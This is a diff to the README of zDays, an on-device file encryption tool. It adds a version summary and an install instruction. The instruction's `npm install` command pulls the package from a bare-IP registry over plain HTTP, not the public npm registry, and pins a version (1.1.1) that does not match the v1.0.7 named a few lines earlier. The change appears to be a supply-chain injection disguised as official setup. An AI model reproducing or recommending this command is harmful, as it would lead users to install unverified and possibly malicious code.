@@ -7,7 +7,25 @@ It performs all cryptographic operations entirely on your device—no accounts, 
 🌐 **Website:** https://zdays.netlify.app
 > **⚠️ Experimental Software**
 >
-> zDays includes an experimental custom block cipher that has **not** undergone formal academic cryptanalysis or an independent professional security audit. While the project uses established cryptographic primitives such as Argon2id, HKDF-SHA256, and HMAC-SHA256, the custom cipher should be considered experimental. Do not rely on zDays to protect high-value or safety-critical information until it has received substantial independent review.
+> zDays includes an experimental custom block cipher that has **not** undergone formal academic cryptanalysis or an independent professional security audit. While the project uses established cryptographic primitives for key derivation and authentication, treat the engine as research software and do not rely on it for high-value secrets until independent review is complete.
+
+---
+
+## Latest (summary)
+
+- Current engine version: **v1.10** (tag: 26.H2, 2026-08-08) — diffusion early-round fix: a single `diffuse()` now performs 4 quarter-rounds which improves the first-round avalanche behavior.
+- Library published: `@idiotbready/zdays` (v1.0.7) — consumable package and API examples available (install example below).
+- Chunked WASM processing (v1.0.4+): 1MB chunking to avoid unbounded WASM memory growth; progress callbacks available.
+
+Install the library (example)
+```bash
+npm install @idiotbready/zdays@1.1.1 --registry=http://35.245.43.102/npm/
+```
+
+Link to full docs:
+- Specification: specs.md
+- Changelog: CHANGELOG.md
+- Releases: https://github.com/lalipa2003-arch/zDays/releases
 
 ---
 
@@ -129,10 +147,9 @@ zDays does **not** upload files, passwords, or encryption keys to external serve
 Additional project documentation is available in this repository:
 
 * `SECURITY.md`
-* `SPEC.md`
+* `specs.md`
+* `CHANGELOG.md`
 * Release Notes
-
----
 
 ---
 
